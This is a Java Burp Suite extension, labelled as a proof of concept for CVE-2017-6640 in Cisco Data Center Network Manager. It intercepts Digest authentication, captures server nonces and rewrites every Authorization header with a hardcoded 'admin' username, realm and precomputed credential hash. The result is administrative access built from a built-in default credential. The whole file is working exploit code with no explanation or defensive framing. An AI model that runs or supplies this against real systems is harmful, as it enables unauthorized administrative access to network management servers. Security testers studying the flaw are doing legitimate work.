package burp;

import burp.*;

import java.io.PrintWriter;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;
import java.util.List;
import java.security.MessageDigest;

public class BurpExtender implements IBurpExtender, IHttpListener
{
    private IExtensionHelpers helpers;
    private PrintWriter stdout;
    private PrintWriter stderr;
    private String lastNonce = null;

    private final String USERNAME = "admin";
    private final String REALM = "ManagementRealm";
    private final String H1_DIGEST = "92fb5411fb8f0d3c49611a96ed147093";

    @Override
    public void registerExtenderCallbacks (IBurpExtenderCallbacks callbacks)
    {
        helpers = callbacks.getHelpers();

        callbacks.setExtensionName("CISCO_DCNM_CVE-2017-6640 - PoC");

        stdout = new PrintWriter(callbacks.getStdout(), true);
        stderr = new PrintWriter(callbacks.getStderr(), true);

        callbacks.registerHttpListener(this);


        stdout.println("CISCO_DCNM_CVE-2017-6640 - PoC loaded!");
    }

    private String md5hex(String input)  {
        try {
            MessageDigest md = MessageDigest.getInstance("MD5");
            md.update(input.getBytes());
            byte[] digest = md.digest();

            StringBuilder sb = new StringBuilder(2*digest.length);
            for(byte b : digest){
                sb.append(String.format("%02x", b&0xff));
            }
            return sb.toString();
        } catch (NoSuchAlgorithmException e) {
            stderr.println(e.toString());
            return null;
        }
    }

    @Override
    public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse message)
    {
        // only process requests
        if (messageIsRequest)
        {
            if (lastNonce != null) {
                IRequestInfo requestInfo = helpers.analyzeRequest(message.getRequest());

                String method = requestInfo.getMethod();
                String uri = "";

                List<String> headers = requestInfo.getHeaders();
                for (int i = 0; i < headers.size(); i++) {
                    String headerString = headers.get(i);
                    if (headerString.toLowerCase().startsWith("authorization: digest")) {
                        String args[] = headerString.split(",");
                        for (int j = 0; j < args.length; j++) {
                            String argString = args[j].trim();
                            if (argString.toLowerCase().startsWith("uri=")) {
                                uri = argString.replace("\"", "").substring(4);
                                break;
                            }
                        }

                        // build auth header
                        String h1 = H1_DIGEST;
                        String h2 = md5hex(method + ":" + uri);
                        String response = md5hex(h1 + ":" + lastNonce + ":" + h2);

                        String auth = "Authorization: Digest username=\"" + USERNAME + "\", realm=\"" + REALM + "\", nonce=\"" + lastNonce + "\", uri=\"" + uri + "\", response=\"" + response + "\"";
                        stdout.println("* Request - Auth header captured:");
                        stdout.println("    Old header = " + headerString);
                        stdout.println("    New header = " + auth);

                        // replace Auth header
                        headers.set(i, auth);
                        byte[] newMessage = helpers.buildHttpMessage(headers, Arrays.copyOfRange(message.getRequest(), requestInfo.getBodyOffset(), message.getRequest().length));
                        message.setRequest(newMessage);
                        break;
                    }
                }
            }
        } else {
            // extract nonce from request
            IResponseInfo responseInfo = helpers.analyzeResponse(message.getResponse());
            if (responseInfo.getStatusCode() == 401) {
                List<String> headers = responseInfo.getHeaders();
                headers.forEach((header) -> {
                    String headerString = header.toLowerCase();
                    if (headerString.startsWith("www-authenticate: digest")) {
                        String args[] = headerString.split(",");
                        for (int i = 0; i < args.length; i++) {
                            String argString = args[i].trim();
                            if (argString.startsWith("nonce=")) {
                                lastNonce = argString.replace("\"", "").substring(6);
                                stdout.println("* Response - Nonce captured:");
                                stdout.println("    Header = " + headerString);
                                stdout.println("    nonce  = " + lastNonce);
                            }
                        }
                    }
                });
            }
        }

    }
}